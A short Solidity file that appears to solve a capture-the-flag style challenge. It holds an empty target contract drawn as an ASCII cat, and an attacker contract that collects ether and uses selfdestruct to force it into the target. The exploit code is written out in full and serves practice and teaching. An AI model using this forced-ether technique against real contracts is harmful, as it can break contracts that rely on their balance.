// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract darkForce{
    Force public force;
    address payable forcecontract;
    uint256 balance;

    constructor(address _addressForce){
        force = Force(_addressForce);
        forcecontract = payable(address(force));
    }

    function destruct() payable public {
        selfdestruct(forcecontract);
    }

    function deposit() external payable{
        balance = balance + msg.value;
    }
}